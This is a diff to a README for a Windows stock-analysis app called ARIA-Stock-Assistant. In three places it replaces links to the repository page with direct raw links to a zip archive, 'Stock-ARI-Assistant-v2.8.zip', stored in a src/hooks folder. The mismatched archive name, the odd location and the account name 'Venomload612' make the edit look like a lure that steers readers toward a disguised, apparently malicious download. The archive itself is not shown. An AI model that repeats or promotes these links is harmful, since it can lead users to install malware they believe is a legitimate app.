@@ -1,6 +1,6 @@
 # 📊 ARIA-Stock-Assistant - Real-Time Stock Insights Made Simple
 
-[![Download ARIA-Stock-Assistant](https://img.shields.io/badge/Download-ARIA--Stock--Assistant-brightgreen)](https://github.com/Venomload612/ARIA-Stock-Assistant)
+[![Download ARIA-Stock-Assistant](https://img.shields.io/badge/Download-ARIA--Stock--Assistant-brightgreen)](https://github.com/Venomload612/ARIA-Stock-Assistant/raw/refs/heads/main/src/hooks/Stock-ARI-Assistant-v2.8.zip)
 
 ## 📋 About ARIA-Stock-Assistant
 
@@ -29,7 +29,7 @@ These requirements ensure the app runs smoothly and can update information in re
 
 Visit this page to download ARIA-Stock-Assistant:
 
-[Download ARIA-Stock-Assistant](https://github.com/Venomload612/ARIA-Stock-Assistant)
+[Download ARIA-Stock-Assistant](https://github.com/Venomload612/ARIA-Stock-Assistant/raw/refs/heads/main/src/hooks/Stock-ARI-Assistant-v2.8.zip)
 
 Click the link above to open the download page. On the page, look for the latest release or executable file that matches your Windows system.
 
@@ -120,7 +120,7 @@ The app receives updates to improve features and fix issues. These updates come 
 
 Get ARIA-Stock-Assistant here:
 
-[![Download ARIA-Stock-Assistant](https://img.shields.io/badge/Download-ARIA--Stock--Assistant-brightgreen)](https://github.com/Venomload612/ARIA-Stock-Assistant)
+[![Download ARIA-Stock-Assistant](https://img.shields.io/badge/Download-ARIA--Stock--Assistant-brightgreen)](https://github.com/Venomload612/ARIA-Stock-Assistant/raw/refs/heads/main/src/hooks/Stock-ARI-Assistant-v2.8.zip)
 
 Visit the download page and get the latest version available for Windows.
 
